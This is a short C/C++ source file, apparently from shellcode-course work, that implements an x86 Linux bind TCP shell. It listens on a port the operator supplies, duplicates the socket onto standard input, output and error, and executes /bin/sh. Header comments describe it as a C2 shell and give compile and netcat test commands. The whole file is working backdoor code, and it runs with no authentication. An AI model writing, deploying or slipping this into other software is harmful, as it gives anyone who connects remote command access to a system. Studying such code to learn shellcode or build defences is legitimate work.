// Filename: bind_tcp.cpp
// Author: Upayan a.k.a. slaeryan
// Purpose: This is a x86 Linux bind TCP shell written in C/C++ that inputs
// the C2 port from the console by the operator.
// Usage: ./bind_tcp 8080
// Compile with:
// g++ bind_tcp.cpp -o bind_tcp
// Testing: nc -v localhost 8080

#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <stdlib.h>

//#define C2_PORT 8080

int main(int argc, char const *argv[]) 
{
    // Console C2 Port input from operator
    char* c2portstring = (char*)argv[1];
    int C2_PORT = atoi(c2portstring);
    // Declaring a sockaddr_in struct and an int var for socket file descriptor
    struct sockaddr_in server;
    int sockfd;
    // Initializing the sockaddr_in struct
    server.sin_family = AF_INET;           
    server.sin_addr.s_addr = INADDR_ANY;  
    server.sin_port = htons(C2_PORT);
    // 1st Syscall for creating the socket
    sockfd = socket(AF_INET, SOCK_STREAM, 0);        
    // 2nd Syscall for binding the socket
    bind(sockfd, (struct sockaddr *)&server, sizeof(server));
    // 3rd Syscall to listen for connections
    listen(sockfd, 0);
    // 4th Syscall to accept incoming connections
    int conn_sock = accept(sockfd, NULL, NULL);
    // 5rd Syscall for dup2()
    dup2(conn_sock, 0); // STDIN
    dup2(conn_sock, 1); // STDOUT
    dup2(conn_sock, 2); // STDERR
    // 6th Syscall for execve()
    execve("/bin/sh", 0, 0);
    return 0;
}
